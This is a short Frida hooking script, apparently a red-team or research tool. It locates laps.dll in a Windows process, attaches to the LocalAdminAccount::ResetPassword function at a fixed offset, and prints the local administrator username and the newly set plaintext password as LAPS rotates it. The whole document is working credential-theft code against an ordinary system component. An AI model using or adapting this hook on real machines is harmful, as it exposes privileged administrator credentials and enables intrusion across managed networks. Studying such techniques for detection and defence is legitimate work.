const offset = 0x29ab8; // Update me - offset to the target function

const moduleName = 'laps.dll';
const targetModule = Process.enumerateModules().find(mod => mod.name.toLowerCase().includes(moduleName.toLowerCase()));

if (targetModule !== undefined) {
    const baseAddr = targetModule.base;
    const targetFuncAddr = baseAddr.add(offset);
    console.log(`[+] Base address of ${moduleName}: ${baseAddr}`);   
    console.log(`[+] Hooking function at ${targetFuncAddr} (offset 0x${offset.toString(16)})`);

    Interceptor.attach(targetFuncAddr, {
        onEnter: function (args) {
            console.log('[GET] LocalAdminAccount::ResetPassword');
            
                    const usernamePtr = args[0].add(0x18).readPointer();
                    const passwordPtr = args[1];
            
                    const username = usernamePtr.readUtf16String();
                    const password = passwordPtr.readUtf16String();
            
                    console.log(` --> Username: (${usernamePtr}) ${username} / Password: (${passwordPtr}) ${password}`);
        },
        onLeave: function (retval) {
            // No operation
        }
    });

} else {
    console.error(`[-] Could not find base address for ${moduleName}`);
}

